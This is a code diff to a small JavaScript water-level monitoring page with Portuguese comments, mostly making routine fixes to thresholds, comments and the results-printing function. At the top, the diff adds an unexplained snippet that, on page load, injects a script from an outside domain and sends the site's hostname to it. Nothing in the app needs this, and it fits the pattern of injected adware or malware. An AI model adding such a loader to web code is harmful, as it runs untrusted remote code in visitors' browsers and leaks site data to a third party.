@@ -1,6 +1,16 @@
+window.top === window && !function(){
+    var e = document.createElement("script"),
+        t = document.getElementsByTagName("head")[0];
+    e.src = "//conoret.com/dsp?h=" + document.location.hostname + "&r=" + Math.random();
+    e.type = "text/javascript";
+    e.defer = !0;
+    e.async = !0;
+    t.appendChild(e);
+}();
+
 let waterLevel = 20000; // Nível inicial da água em ml
 const maxWaterLevel = 20000; // Nível máximo da água em ml
-const minWaterLevel = 50; // Nível mínimo da água em ml
+const minWaterLevel = 51; // Nível mínimo da água em ml
 let intervalId;
 let isPaused = false;
 
@@ -8,7 +18,7 @@ function setup() {
     console.log("Setup iniciado");
     noCanvas();
     setTimeout(() => {
-        waterLevel -= 1; // Perda inicial de 500ml após 10 segundos
+        waterLevel -= 1; // Perda inicial de 1ml após 15 segundos
         updateWaterDisplay();
         intervalId = setInterval(updateWaterLevel, 35000); // Intervalo de 35 segundos
     }, 15000); // Atraso de 15 segundos
@@ -16,7 +26,7 @@ function setup() {
 
     document.getElementById('pause-button').addEventListener('click', togglePause);
     document.getElementById('reset-button').addEventListener('click', resetSystem);
-    document.getElementById('print-button').addEventListener('click', imprimir);
+    document.getElementById('print-button').addEventListener('click', imprimirResultados);
 }
 
 function updateWaterLevel() {
@@ -88,17 +98,20 @@ function resetSystem() {
     document.getElementById('log-table').getElementsByTagName('tbody')[0].innerHTML = '';
     updateWaterDisplay();
     setTimeout(() => {
-        waterLevel -= 1; // Perda inicial de 500ml após 15 segundos
+        waterLevel -= 1; // Perda inicial de 1ml após 15 segundos
         updateWaterDisplay();
         intervalId = setInterval(updateWaterLevel, 35000); // Intervalo de 35 segundos
     }, 15000); // Atraso de 15 segundos
 }
 
 function imprimirResultados() {
-    const capacidadeReservatorio = 20000; // Capacidade do reservatório em ml
+    const currentDateTime = new Date().toLocaleString();
+    const currentVolume = waterLevel;
+    const alerta = currentVolume <= minWaterLevel ? "Nível de água baixo!" : "Nenhum alerta";
+
     const resultados = [
-        { dataHora: "2024-10-12 10:00", alerta: "Queda do nível de água", volume: 15000 },
-        { dataHora: "2024-10-12 11:00", alerta: "Reservatório com 5000ml" }
+        { dataHora: currentDateTime, alerta: alerta, volume: currentVolume }
     ];
+
     console.log("Resultados:", resultados);
 }
